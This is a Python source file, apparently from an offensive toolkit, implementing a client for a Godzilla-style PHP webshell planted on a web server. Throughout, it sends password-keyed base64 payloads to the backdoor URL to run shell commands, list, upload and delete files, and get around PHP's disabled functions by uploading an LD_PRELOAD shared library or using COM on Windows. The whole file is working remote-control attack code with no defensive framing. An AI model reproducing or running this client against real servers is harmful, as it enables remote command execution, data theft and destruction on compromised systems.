from SpiritCore.System import *
from SpiritCore.Lib.Godzilla.PHP import *
import re, requests, base64,os
from SpiritCore.Lib.Base64 import *

class PhpBackdoor:
    cryp = 0  # 0 base64              Not Support 1  rsa  2 xor
    SystemVersion = 0
    URL = ""
    RequestsObject = None
    UseSession = False
    Password = "pass"
    PhpGodzillaPassword = "password"
    ServerOs = 0
    Sopath=""
    UseBypassDisableFunction=0
    UseGodzilla = True
    Text = ""

    proxies = {
        "http": "127.0.0.1:8080"
    }
    def Connect(self):
        if self.URL != "":
            try:
                if self.UseSession == True:

                    self.RequestsObject = requests.session()
                    if self.RequestsObject.get(self.URL).status_code == 200:
                        return True

                else:
                    self.RequestsObject = requests.get(self.URL)
            except:
                return False
            else:
                if self.RequestsObject.status_code == 200:
                    return True

    def RecvData(self):
        # print(re.findall(r'<Spiriter>(.*)<Spiriter>', self.Text))
        try:
            #print(self.Text)
            return Base64Decode(re.findall(r'<Spiriter>(.*)<Spiriter>', self.Text)[0])
        except Exception as error:
            #open("s.html","w").write(self.Text)
            #print(self.Text)
            print_error(error.__str__())
            return "<Error>"

    def Payload(self, Type=0):
        if Type == 0:  # GetInfo
            Payload = GetInfo
        elif Type == 1:
            Payload = PhpGodzilla
        if self.cryp == 0:
            Payload = Payload % (PhpBase64, self.PhpGodzillaPassword)
        return Payload

    def SendData(self, Data):
        if self.UseSession == True:

            Ret = self.RequestsObject.post(self.URL, data=Data)
            self.Text = Ret.text
            return Ret.text
        else:
            Ret = requests.post(self.URL, data=Data)

        if Ret.status_code == 200:
            return Ret.text

        else:
            print_error("Error:%d" % Ret.status_code)
            return "Error"

    def GetOsVersion(self):
        Data = GetInfo
        Send = {
            self.Password: Data
        }
        OS = self.SendData(Send)

        Values = re.findall(r'<Start>(.*)<End>', OS)
        if Values[0] == "WINNT":
            self.ServerOs = 1
        else:
            self.ServerOs = 0
            # print("Linux")
        # self.Exec()
    def GetFiles(self,Path="/"):
        Send ={
            "methodName":"getFile",
            "dirName":Path
        }
        self.SendGodzillaPayload(self.MakePostData(Send))

        Recv = self.RecvData()

        return Base64Decode(Recv)
    def ExecuteCommand(self,Command,Path="/"):
        #print(Path)

        if self.ServerOs==0:
            Base = PhpExecLinuxBashe%(Path,Command)
        else:
            Base = PhpExecWinodwsCmd % (Path, Command)
        #(Base)
        if self.UseBypassDisableFunction==0:
            Send = {
                "cmdLine":Base,
                "methodName":"execCommand"

            }#LD_PRELOAD
        elif self.UseBypassDisableFunction==1:
            Base=Command
            Send = {
                "Cmdline": Base,
                "methodName": "LD_PRELOAD",
                "Sopath":self.Sopath
            }
        elif self.UseBypassDisableFunction==2:
            Send={
                "methodName":"COM_BYPASS",
                "Comdline":Base
            }

        #print(Send)
        #print(self.MakePostData(Send))

        self.SendGodzillaPayload(self.MakePostData(Send))
        try:
            Recv= self.RecvData()

            #print(Base64Decode(Recv))
            Data=Base64Decode(Recv).split("[S]")
            #print("s")
        except Exception as error:
            print(error)
        return Data
    def DelectDir(self,Dir,Path="/"):
        Send={
            "methodName":"deleteFile",
            "fileName":Dir
        }
        self.SendGodzillaPayload(self.MakePostData(Send))
        if Base64Decode(self.RecvData())=="ok":
            print_success("Delect %s Suucessfuly!"%Dir)
    def UploadFile(self,LocalFile,Path="/"):
        (filepath, tempfilename) = os.path.split(LocalFile)
        Send={
            "methodName":"uploadFile",
            "fileName":"%s/%s"%(Path,tempfilename),
            "fileValue":open(LocalFile,"rb+").read()
        }
        print_msg("File Size:%d"%len(open(LocalFile,"rb+").read()))
        print_success("File upload successfully")
        self.SendGodzillaPayload(self.MakePostData(Send))
        if Base64Decode(self.RecvData())=="ok":
            return "%s/%s"%(Path,tempfilename)
        elif Base64Decode(self.RecvData())=="fail":
            return ""
    def GetInfo(self):
        Payload="methodName=Z2V0QmFzaWNzSW5mbw=="

        Recv = self.SendGodzillaPayload(Payload)
        return Base64Decode(self.RecvData())
    def MakePostData(self,parame):
        DataList=[]
        for key in parame.keys():
            DataList.append(key+"="+Base64Encode(parame[key]))
        return "&".join(DataList)
    def InitGozilla(self):
        Payload = self.Payload(1)
        Send = {
            self.Password: Payload,
            self.PhpGodzillaPassword: Base64Encode(PhpBackdoorCore)
        }
        self.SendData(Send)

    def SendGodzillaPayload(self, Pay):
        Payload = self.Payload(1)
        #print(Pay)
        Send = {
            self.Password: Payload,
            self.PhpGodzillaPassword: str(Base64Encode(Pay))

        }
        # print(Send)
        #print(Send)
        #print( self.SendData(Send))
        RecvD=""
        try:
            RecvD = re.findall(r'<Spiriter>(.*)<Spiriter>', self.SendData(Send))
            #print(RecvD)
        except:
            print_error("Recv {}")
        return RecvD
    def BypassDisableFunction(self,Arch="x64",Path="/"):
        Parame={
            "1":"LD_PRELOAD (  Linux  )",
            "2":"COM Bypass ( Windows )"
        }
        D = input_chions("1","Type",Parame,"Bypass Disable function Type")
        if D == "1":
            if Arch:
                bypass_disablefunc ="SpiritCore/Lib/Godzilla/bypass_disablefunc_x64.so"
            self.Sopath = self.UploadFile(bypass_disablefunc,Path)
            self.UseBypassDisableFunction=1
        elif D=="2":
            self.UseBypassDisableFunction=2